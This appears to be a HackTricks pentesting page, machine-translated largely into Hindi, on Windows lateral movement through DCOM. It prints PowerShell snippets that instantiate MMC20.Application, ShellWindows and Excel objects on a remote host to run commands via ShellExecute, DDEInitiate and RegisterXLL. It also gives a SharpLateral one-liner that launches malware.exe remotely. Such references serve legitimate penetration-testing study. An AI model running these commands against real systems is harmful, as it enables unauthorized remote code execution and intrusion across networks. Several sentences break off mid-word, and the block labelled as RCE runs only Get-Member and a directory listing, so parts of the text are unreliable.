# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, **The PEASS Family** की खोज करें
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे सुरक्षा गड़बड़ी खोजें जो सबसे अधिक मायने रखती है ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक मुद्दे खोजता है। [**आज ही मुफ्त में इसे ट्राई करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

वितरित कॉम्पोनेंट ऑब्जेक्ट मॉडल (DCOM) ऑब्जेक्ट्स नेटवर्क-आधारित ऑब्जेक्ट्स के साथ दिलचस्प क्षमता प्रस्तुत करते हैं। माइक्रोसॉफ्ट DCOM और कॉम्पोनेंट ऑब्जेक्ट मॉडल (COM) के लिए व्यापक दस्तावेज़ीकरण प्रदान करता है, जिसका उपयोग [DCOM के लिए यहाँ](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [COM के लिए यहाँ](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) किया जा सकता है। DCOM एप्लिकेशनों की सूची PowerShell कमांड का उपयोग करके प्राप्त की जा सकती है:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Check it running:

This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
यह कमांड DCOM एप्लिकेशन से कनेक्ट करता है और COM ऑब्ज
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
प्राप्त करें RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
अधिक जानकारी के लिए [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) देखें

## ShellWindows & ShellBrowserWindow

**MMC20.Application** ऑब्जेक्ट का पता लगाया गया कि यह "LaunchPermissions" को स्पष्ट रूप से अभाविप्त करता है, जो प्रशासकों को पहुंचने की अनुमति देता है। अधिक विवरणों के लिए, एक थ्रेड [यहाँ](https://twitter.com/tiraniddo/status/817532039771525120) जांचा जा सकता है, और [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET का उपयोग किया जाता है।

दो विशेष ऑब्ज
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Excel DCOM ऑब्जेक्ट के साथ लैटरल मूवमेंट

लैटरल मूवमेंट को DCOM Excel ऑब्जेक्ट का शोषण करके प्राप्त किया जा सकता है। विस्तृत जानकारी के लिए, सुझाव दिया जाता है कि [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) पर DCOM के माध्यम से लैटरल मूवमेंट के लिए Excel DDE का उपयोग करने पर चर्चा की जाए।

Empire परियोजना एक PowerShell स्क्रिप्ट प्रदान करती है, जो Excel का उपयोग द्वारा दूरस्थ कोड निष्पादन (RCE) का प्रदर्शन करता है जिसे DCOM ऑब्जेक्ट को मानिपुलेट करके किया जाता है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) पर उपलब्ध स्क्रिप्ट से अलग-अलग विधियों का प्रदर्शन करते हुए Excel का दुरुपयोग करने के लिए RCE के लिए:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### लेटरल मूवमेंट के लिए स्वचालन उपकरण

इन तकनीकों को स्वचालित करने के लिए दो उपकरणों को उजागर किया गया है:

- **Invoke-DCOM.ps1**: एक PowerShell स्क्रिप्ट जो विभिन्न विधियों को आसानी से अभिवादन करने के लिए उपयुक्त है जिससे दूरस्थ मशीनों पर कोड का निष्पादन किया जा सकता है। यह स्क्रिप्ट Empire GitHub भंडार में उपलब्ध है।

- **SharpLateral**: एक उपकरण जो दूरस्थ स्थान पर कोड का निष्पादन करने के लिए डिज़ाइन किया गया है, जिसे निम्नलिखित कमांड के साथ उपयोग किया जा सकता है:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## स्वचालित उपकरण

* Powershell स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) को आसानी से अन्य मशीनों में कोड निष्पादित करने के सभी टिप्पणीत तरीकों को आमंत्रित करने की अनुमति देता है।
* आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## संदर्भ

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे सुरक्षा दोषों को खोजें जो सबसे अधिक मायने रखते हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक मुद्दे खोजता है। [**आज ही मुफ्त में इसका प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को PRs सबमिट करके।

</details>
